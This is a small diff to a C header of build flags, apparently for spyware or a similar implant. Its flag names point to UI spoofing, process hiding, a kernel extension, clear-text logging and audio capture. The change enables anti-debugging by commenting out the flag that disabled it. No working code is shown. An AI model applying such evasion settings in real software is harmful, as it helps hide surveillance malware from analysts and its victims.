@@ -16,7 +16,7 @@
 //#define NO_UISPOOF
 //#define NO_PROC_HIDING
 //#define NO_KEXT
-#define NO_ANTIDEBUGGING
+//#define NO_ANTIDEBUGGING
 //#define WRITE_CLEAR_TEXT_LOG
 //#define DEBUG_UI_SPOOF
 //#define DEBUG_SPEEX
